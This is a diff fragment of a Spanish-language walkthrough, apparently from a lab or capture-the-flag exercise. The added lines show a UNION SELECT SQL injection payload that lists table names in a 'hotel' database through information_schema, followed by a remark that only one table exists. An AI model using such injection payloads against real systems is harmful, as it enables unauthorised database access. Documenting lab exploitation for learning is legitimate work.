@@ -90,7 +90,14 @@ Esta es la primera tabla de la base de datos de hotel
 
 ![Resultado de Nmap](IMG/bd3.png)
 
+Vemos si hay mas
 
+```
+union select 1,2,table_name,4,5,6,7 from information_schema.tables where table_schema="hotel" limit 1,1-- -
+```
+Pero vemos que es la unica
+
+![Resultado de Nmap](IMG/bd4.png)
 
 
 
